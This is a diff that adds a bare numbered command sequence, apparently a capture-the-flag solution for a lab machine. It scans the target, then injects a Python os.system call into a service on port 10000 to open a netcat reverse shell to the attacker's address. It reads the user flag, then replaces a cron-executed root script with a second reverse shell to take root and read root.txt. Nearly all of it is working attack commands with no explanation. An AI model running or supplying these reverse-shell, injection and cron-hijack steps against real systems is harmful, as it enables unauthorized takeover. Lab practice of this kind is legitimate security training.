@@ -1,0 +1,13 @@
+1 - nmap -A 10.10.12.159
+2 - telnet 10.10.12.159 10000
+3 - echo "__import__('os').system('nc 10.8.94.51 4444 -e /bin/bash')" | nc 10.10.12.159 10000
+4 - cat user.txt
+5 - cat /etc/crontab
+6 - rm /home/king/root.sh
+7 - cat > /home/king/root.sh << EOF
+#!/bin/bash
+nc 10.8.94.51 4445 -e /bin/bash
+EOF
+
+8 - chmod +x root.sh
+9 - cat /root/root.txt
